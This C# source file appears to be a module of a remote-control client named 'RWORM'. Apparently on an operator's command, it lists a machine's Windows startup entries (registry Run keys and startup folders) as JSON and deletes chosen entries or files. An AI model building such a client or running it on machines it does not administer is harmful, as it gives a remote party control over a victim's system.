using System;
using System.IO;
using System.Text;
using Microsoft.Win32;
using RWORM.Client.Core;

namespace RWORM.Client.Modules
{
    public static class AutorunManager
    {
        public static byte[] ListStartupEntries()
        {
            var sb = new StringBuilder("[");
            bool first = true;

            void AppendEntry(string name, string cmd, string loc, string scp)
            {
                if (!first) sb.Append(',');
                first = false;
                string n = JsonHelper.Escape(name);
                string c = JsonHelper.Escape(cmd);
                string l = JsonHelper.Escape(loc);
                string s = JsonHelper.Escape(scp);
                sb.Append($"{{\"scope\":\"{s}\",\"name\":\"{n}\",\"command\":\"{c}\",\"location\":\"{l}\"}}");
            }

            
            ReadRegRun(Registry.CurrentUser, @"Software\Microsoft\Windows\CurrentVersion\Run", "HKCU Run", AppendEntry);
            ReadRegRun(Registry.CurrentUser, @"Software\Microsoft\Windows\CurrentVersion\RunOnce", "HKCU RunOnce", AppendEntry);

            
            ReadRegRun(Registry.LocalMachine, @"Software\Microsoft\Windows\CurrentVersion\Run", "HKLM Run", AppendEntry);
            ReadRegRun(Registry.LocalMachine, @"Software\Microsoft\Windows\CurrentVersion\RunOnce", "HKLM RunOnce", AppendEntry);
            ReadRegRun(Registry.LocalMachine, @"Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run", "HKLM Wow64 Run", AppendEntry);

            
            try
            {
                var userStartup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                if (Directory.Exists(userStartup))
                {
                    foreach (var file in Directory.GetFiles(userStartup))
                    {
                        AppendEntry(Path.GetFileName(file), file, file, "User Startup Folder");
                    }
                }
            }
            catch { }

            
            try
            {
                var commonStartup = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
                if (Directory.Exists(commonStartup))
                {
                    foreach (var file in Directory.GetFiles(commonStartup))
                    {
                        AppendEntry(Path.GetFileName(file), file, file, "All Users Startup Folder");
                    }
                }
            }
            catch { }

            sb.Append(']');
            return Encoding.UTF8.GetBytes(sb.ToString());
        }

        private static void ReadRegRun(RegistryKey root, string subKey, string scope, Action<string, string, string, string> onEntry)
        {
            try
            {
                using var key = root.OpenSubKey(subKey, false);
                if (key != null)
                {
                    foreach (var valName in key.GetValueNames())
                    {
                        var val = key.GetValue(valName)?.ToString() ?? "";
                        onEntry(valName, val, $"{root.Name}\\{subKey}", scope);
                    }
                }
            }
            catch { }
        }

        public static byte[] DeleteStartupEntry(string scope, string name, string location)
        {
            try
            {
                if (scope.Contains("HKCU"))
                {
                    string sub = scope.Contains("RunOnce") 
                        ? @"Software\Microsoft\Windows\CurrentVersion\RunOnce" 
                        : @"Software\Microsoft\Windows\CurrentVersion\Run";
                    using var key = Registry.CurrentUser.OpenSubKey(sub, true);
                    key?.DeleteValue(name, false);
                }
                else if (scope.Contains("HKLM") || scope.Contains("Wow64"))
                {
                    string sub = @"Software\Microsoft\Windows\CurrentVersion\Run";
                    if (scope.Contains("RunOnce")) sub = @"Software\Microsoft\Windows\CurrentVersion\RunOnce";
                    else if (scope.Contains("Wow64")) sub = @"Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run";

                    using var key = Registry.LocalMachine.OpenSubKey(sub, true);
                    key?.DeleteValue(name, false);
                }
                else if (File.Exists(location))
                {
                    File.Delete(location);
                }
                else if (Directory.Exists(location))
                {
                    var targetFile = Path.Combine(location, name);
                    if (File.Exists(targetFile))
                        File.Delete(targetFile);
                }

                return Encoding.UTF8.GetBytes("{\"ok\":true}");
            }
            catch (Exception ex)
            {
                var err = JsonHelper.Escape(ex.Message);
                return Encoding.UTF8.GetBytes($"{{\"ok\":false,\"error\":\"{err}\"}}");
            }
        }
    }
}
